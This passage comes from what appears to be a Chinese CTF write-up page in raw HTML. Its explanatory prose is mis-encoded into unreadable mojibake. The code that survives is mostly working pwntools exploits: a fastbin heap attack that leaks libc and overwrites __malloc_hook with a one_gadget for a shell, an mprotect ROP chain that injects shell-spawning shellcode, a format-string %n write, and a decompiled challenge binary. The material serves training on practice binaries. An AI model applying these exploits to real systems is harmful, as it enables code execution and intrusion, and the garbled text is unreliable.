</code></pre><p><code>0x7f</code> å¯¹åº”çš„ <code>malloc</code> è¯·æ±‚å¤§å°å¤§çº¦æ˜¯ <code>0x60</code>ã€‚ç°åœ¨ï¼Œfreelist é¡¶éƒ¨æ˜¯ <code>e</code>ï¼Œäºæ˜¯ <code>alloc(0x60)</code> å°±ä¼šåˆ†é…æ€»å¤§å°ä¸º <code>0x71</code>ã€èµ·ç‚¹ä¸ <code>e</code> ç›¸åŒã€ä¸”ç´¢å¼•ä¸º <code>4</code> çš„ chunk <code>g</code>ï¼Œè¿™æ—¶å† <code>free</code> æ‰ <code>g</code> å°±ä¼šä½¿å¾— <code>g</code> ä½äº freelist é¡¶éƒ¨ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># g4</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=c1># g</span>
</span></span></code></pre></div><p>æ¥ä¸‹æ¥ä¿®æ”¹ç´¢å¼•ä¸º <code>2</code> çš„ chunk çš„ <code>fd</code>ï¼ˆå®é™…å°±æ˜¯ä¸ºäº†ä¿®æ”¹ <code>e</code> æˆ–è€…è¯´ <code>g</code> çš„ <code>fd</code>ï¼‰æŒ‡å‘ <code>_IO_wide_data_0+301</code> åœ°å€ï¼Œç„¶åç¬¬ä¸€æ¬¡ <code>Allocate</code> å¾—åˆ° <code>g</code> ä½äºç´¢å¼• <code>5</code>ï¼Œç¬¬äºŒæ¬¡ <code>Allocate</code> å¾—åˆ°æŒ‡å‘ <code>_IO_wide_data_0+301</code> çš„æŒ‡é’ˆï¼Œä½äºç´¢å¼• <code>6</code>ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># g-&gt;fd = _IO()</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>base</span><span class=o>+</span><span class=mh>0x3c4aed</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># g5</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># _IO()6</span>
</span></span></code></pre></div><p>è€Œç”±ä¸Šé¢çš„ gdb åˆ†æå¯çŸ¥å¾—åˆ°çš„æŒ‡é’ˆä½äº <code>0xaed</code>ï¼Œ<code>__malloc_hook</code> ä½äº <code>0xb10</code>ï¼ˆPIE ä¸‹ä½ 12 ä½å›ºå®šï¼‰ï¼Œç›¸å·® <code>0x13</code>ã€‚å› æ­¤å¡«å…… <code>0x13</code> å­—èŠ‚çš„ padding åå†æ”¾ä¸Š getshell çš„ gadget åœ°å€å³å¯ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># _IO() + 13 == __malloc_hook(), one_gadget</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mh>0x13</span><span class=p>,</span> <span class=n>base</span><span class=o>+</span><span class=mh>0x4526a</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>æœ€åä¸è¦å¿˜è®°å†ç”³è¯·ä¸€æ¬¡ä»»æ„å¤§å°å†…å­˜ä»¥è°ƒç”¨ <code>__malloc_hook</code>ã€‚å®Œæ•´ expï¼Œæ³¨æ„æœ€åä¸€æ¬¡ alloc è¿”å›å¾—æœ‰ç‚¹æ…¢ï¼Œ<code>recvuntil</code> æœ€å¥½åŠ ä¸€ä¸ª <code>timeout</code>ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>alloc</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>fill</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dump</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>alloc</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span> <span class=c1># a0,b1,c2,d3</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span> <span class=c1># e4</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># b</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># c</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># c-&gt;fd = e</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x80</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># e-&gt;chunk_size = 0x21</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span> <span class=c1># c1</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span> <span class=c1># e2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># e-&gt;chunk_size = 0x91</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x91</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span> <span class=c1># f5</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=c1># e, e-&gt;fd = unsorted_head</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>dump</span><span class=p>(</span><span class=mi>2</span><span class=p>)[:</span><span class=mi>8</span><span class=p>])</span><span class=o>-</span><span class=mh>0x3c4b78</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;libc_base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># g4</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=c1># g</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># g-&gt;fd = _IO()</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>base</span><span class=o>+</span><span class=mh>0x3c4aed</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># g5</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># _IO()6</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># _IO() + 0x13 == __malloc_hook(), one_gadget</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mh>0x13</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>base</span><span class=o>+</span><span class=mh>0x4526a</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># malloc() -&gt; __malloc_hook()</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=get_started_3dsctf_2016 class="relative group">get_started_3dsctf_2016 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#get_started_3dsctf_2016 aria-label=é”šç‚¹>#</a></span></h3><p>æœ¬åœ°è¿è¡Œè„šæœ¬ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>get_flag</span> <span class=o>=</span> <span class=mh>0x80489a0</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x38</span><span class=p>,</span><span class=n>get_flag</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span><span class=mh>0x308cd64f</span><span class=p>,</span><span class=mh>0x195719d1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=n>r</span><span class=p>()</span>
</span></span></code></pre></div><p>æœ¬æ¥è¿™æ ·æ˜¯å¯ä»¥ç›´æ¥è¯»å– flag çš„ï¼Œä½†æ˜¯è¿œç¨‹ä¸è¡Œã€‚å› æ­¤è¿œç¨‹è¿è¡Œæ—¶æ¢äº†ä¸€ç§æ›´å…·éš¾åº¦çš„æ–¹æ³•ï¼Œå°±æ˜¯è°ƒç”¨ <code>mprotect</code> ä¿®æ”¹ <code>bss</code> æ®µæƒé™ä½¿å¾—å…¶å¯æ‰§è¡Œï¼Œéšåå†™å…¥ shellcodeã€‚</p><p>éœ€è¦æ³¨æ„ <code>mprotect</code> ç¬¬äºŒä¸ªå‚æ•°è¦æ±‚é¡µå¯¹é½ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸º <code>7</code> è¡¨ç¤º <code>rwx</code>ã€‚ä¿®æ”¹å®Œæˆåä»æ ‡å‡†è¾“å…¥è¯»å…¥ shellcodeï¼Œå†™å…¥ <code>bss_base</code> åè¿”å›åˆ° <code>bss_base</code> å¤„æ‰§è¡Œã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pop3</span> <span class=o>=</span> <span class=mh>0x80483b8</span>
</span></span><span class=line><span class=cl><span class=n>got_base</span> <span class=o>=</span> <span class=mh>0x80eb000</span>
</span></span><span class=line><span class=cl><span class=n>bss_base</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x38</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;mprotect&#39;</span><span class=p>],</span><span class=n>pop3</span><span class=p>,</span><span class=n>got_base</span><span class=p>,</span><span class=mh>0x1000</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=n>pop3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>bss_base</span><span class=p>,</span><span class=mh>0x200</span><span class=p>,</span><span class=n>bss_base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>()))</span>
</span></span></code></pre></div><h3 id=not_the_same_3dsctf_2016 class="relative group">not_the_same_3dsctf_2016 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#not_the_same_3dsctf_2016 aria-label=é”šç‚¹>#</a></span></h3><p>å’Œä¸Šé¢ get_started åšæ³•ä¸€æ ·ã€‚æˆ‘æ€€ç–‘ BUU ä¸Šä¸€é¢˜åœ¨æœåŠ¡å™¨ä¸Šæ”¾é”™äº†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¹Ÿæ”¾äº†è¿™ä¸€é¢˜çš„ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªè„šæœ¬æ‰ä¼šæ— æ•ˆã€‚</p><h3 id=ç¬¬äº”ç©ºé—´-2019-å†³èµ›pwn5 class="relative group">[ç¬¬äº”ç©ºé—´ 2019 å†³èµ›]PWN5 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e7%ac%ac%e4%ba%94%e7%a9%ba%e9%97%b4-2019-%e5%86%b3%e8%b5%9bpwn5 aria-label=é”šç‚¹>#</a></span></h3><p>é•¿åº¦é™åˆ¶æ— æ³•æ ˆæº¢å‡ºï¼Œä½†æ˜¯å­˜åœ¨æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚é€šè¿‡ <code>aaaa %08x %08x ...</code> å¯ä»¥åˆ¤æ–­åç§»ä¸º 10ã€‚</p><p>ç„¶ååˆ©ç”¨ <code>%10$n</code> ä¿®æ”¹ <code>0x804c044</code> åœ°å€ï¼ˆIDA å¾—åˆ°ï¼‰å¤„çš„å€¼å³å¯ï¼Œæœ€åè¾“å…¥ <code>passwd</code> éœ€è¦ä¸å·²æˆåŠŸè¾“å‡ºçš„å­—ç¬¦æ•°ç›¸ç­‰ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹ <code>atoi</code> çš„ GOT åœ°å€ä¸º <code>system</code> çš„ PLT åœ°å€ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x804c044</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;%10$n&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=ciscn_2019_n_8 class="relative group">ciscn_2019_n_8 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#ciscn_2019_n_8 aria-label=é”šç‚¹>#</a></span></h3><p>IDA å¯çŸ¥éœ€è¦è®© var çš„ä¸‹æ ‡ä¸º 13 çš„å…ƒç´ ï¼ˆä¹Ÿå°±æ˜¯ç¬¬ 14 ä¸ªï¼‰ç­‰äº 17ï¼Œç›´æ¥æŒ‰ç…§éœ€æ±‚å†™è„šæœ¬å³å¯ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>p32</span><span class=p>(</span><span class=mi>17</span><span class=p>)</span><span class=o>*</span><span class=mi>14</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=babyfengshui_33c3_2016 class="relative group">babyfengshui_33c3_2016 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#babyfengshui_33c3_2016 aria-label=é”šç‚¹>#</a></span></h3><p>æœ¬é¢˜æºç å¤§è‡´å¦‚ä¸‹ï¼Œå¼€å¯äº† canary å’Œ NXï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=kr>__cdecl</span> <span class=n>__noreturn</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v0</span><span class=p>;</span> <span class=c1>// [esp+3h] [ebp-15h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>action</span><span class=p>;</span> <span class=c1>// [esp+4h] [ebp-14h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>size_t</span> <span class=n>input</span><span class=p>;</span> <span class=c1>// [esp+8h] [ebp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [esp+Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=nf>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>alarm</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;0: Add a user&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;1: Delete a user&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;2: Display a user&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;3: Update a user description&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;4: Exit&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Action:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>action</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>action</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;size of description:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%u%c&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>input</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>add</span><span class=p>(</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>action</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;index:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>delete</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>action</span> <span class=o>==</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;index:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>display</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>action</span> <span class=o>==</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;index:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>update</span><span class=p>(</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>action</span> <span class=o>==</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Bye&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>total_users</span> <span class=o>&gt;</span> <span class=mh>0x31u</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;maximum capacity exceeded, bye&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
